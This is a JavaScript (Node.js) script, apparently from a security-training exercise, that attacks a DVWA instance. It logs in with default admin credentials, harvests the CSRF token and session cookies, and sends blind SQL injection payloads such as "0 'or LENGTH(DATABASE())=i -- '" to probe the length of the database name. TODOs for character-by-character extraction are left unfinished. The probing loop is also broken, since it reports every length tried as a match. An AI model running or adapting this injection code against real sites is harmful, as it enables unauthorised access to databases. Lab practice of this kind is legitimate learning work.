const axios = require('axios');
const URL = 'https://dvwa-g1-03.s.freebs.ovh/';
const SQL_BLIND_URL = 'vulnerabilities/sqli_blind';
//TODO mettre un dictionnaitre avec toutes les url
const headers ={
    'Content-Type' : 'application/x-www-form-urlencoded',
}

let user = {
    username : 'admin',
    password : 'password',
    Login: 'Login',
}
  
const authenticateUser = (url,user) =>{
   axios.get(url)
   .then(response => {
        user.user_token = getToken(response);
        headers.Cookie = getCookies(response);
        postRequest(url,user); // because of statless of HTTP
    })
    .catch(error =>{
        console.log(`error ${error}`)
   })
}

const postRequest = (url,data) =>{
    const user = urlEconded(data);
    axios.post(url,user,{ headers })
    .then(async response =>{
       if(response.status === 200){
            getLengthDatabase();
       }
    }) 
    .catch(error => console.log(`error ${error}`))
}

const urlEconded = (user) =>{
    const userEncoded = new URLSearchParams();
    for(const key in user){
        userEncoded.append(key,user[key])
    }
    return userEncoded;
}

const getToken = ({ data }) =>{
    let pattern = /([a-z,0-9]){32}/
    const index = data.search(pattern);
    return data.slice(index,index+32)
}

const getCookies = ({ headers }) => {
    return headers['set-cookie'].map(cookie => cookie.split(';')[0])
}

const getLengthDatabase = async () =>{
    //0 'or length(database()) = 5 -- -'
    const req = "0 'or LENGTH(DATABASE())";
    for(let i = 1;i < 10;i++){
        axios.
        get(`${URL}/${SQL_BLIND_URL}/?id=${req}=${i} -- '&Submit=Submit#`,{headers}).
        then(response =>{
            console.log(`+ length of database : ${i}`)
        }).
        catch(error => {
            //console.log(`error ${error}`)
        })
    }
}

//TODO function to guess by ASCII value based on giving length

//TODO function to directly get



authenticateUser(`${URL}/login.php`,user);
